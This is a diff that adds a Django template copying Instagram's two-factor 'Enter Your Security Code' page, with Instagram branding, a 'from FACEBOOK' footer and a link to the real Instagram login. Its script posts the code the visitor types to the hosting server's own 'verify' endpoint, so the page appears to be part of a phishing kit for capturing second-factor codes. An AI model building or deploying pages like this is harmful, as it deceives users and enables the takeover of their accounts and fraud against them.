@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    {% load static %}
+    <link rel="stylesheet" href="{% static 'verification.css' %}">
+    <meta charset="utf-8">
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=0"/>
+  </head>
+  <body>
+    <img id='logo' src="{% static 'logo.png' %}" alt="logo">
+    <div class="content">
+      <h1>Enter Your Security Code</h1>
+      <p id="info">Enter the 6-digit code we sent to your email/phone.</p>
+      <div id="divOuter">
+       <div id="divInner">
+         <input id="partitioned" type="tel" maxlength="6" onKeyPress="if(this.value.length==6) return false;"/>
+       </div>
+      </div>
+
+      <div class="login">
+        <button type="button" name="button" onclick="submit()" id="submit">Submit</button>
+      </div>
+
+      <p id="nocode">Didn't receive your code? <a href="https://www.instagram.com/accounts/login/?source=auth_switcher" id="new-code">Get a new one.</a></p>
+    </div>
+    <footer>
+      <p id="from">from</p>
+      <p id="facebook">FACEBOOK</p>
+    </footer>
+  </body>
+</html>
+<style media="screen">
+  #submit {
+    height: 38px;
+    padding: 0;
+  }
+
+</style>
+
+<script src="{% static 'verifyloading.js' %}"></script>
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+<script type="text/javascript">
+  function submit()
+  {
+    var code = document.getElementById("partitioned").value;
+    var xmlHttp = new XMLHttpRequest();
+    var csrftoken = Cookies.get('csrftoken');
+    xmlHttp.open('POST', window.location.href+"verify");
+    xmlHttp.onload = function (e) {
+    if (xmlHttp.readyState === 4) {
+      stopLoading();
+        if (xmlHttp.status === 200) {
+          document.open();
+          window.close();
+          document.write(xmlHttp.responseText);
+          document.close();
+        } else {
+          alert("Failed loading page with status code "+xmlHttp.status);
+        }
+      }
+    };
+    xmlHttp.setRequestHeader('X-CSRFToken', csrftoken);
+    xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    load();
+    xmlHttp.send("code="+code);
+  }
+
+  var obj = document.getElementById('partitioned');
+  obj.addEventListener('keydown', stopCarret);
+  obj.addEventListener('keyup', stopCarret);
+
+  function stopCarret() {
+  	if (obj.value.length > 5){
+  		setCaretPosition(obj, 5);
+  	}
+  }
+
+
+
+  function setCaretPosition(elem, caretPos) {
+      if(elem != null) {
+          if(elem.createTextRange) {
+              var range = elem.createTextRange();
+              range.move('character', caretPos);
+              range.select();
+          }
+          else {
+              if(elem.selectionStart) {
+                  elem.focus();
+                  elem.setSelectionRange(caretPos, caretPos);
+              }
+              else
+                  elem.focus();
+          }
+      }
+  }
+</script>
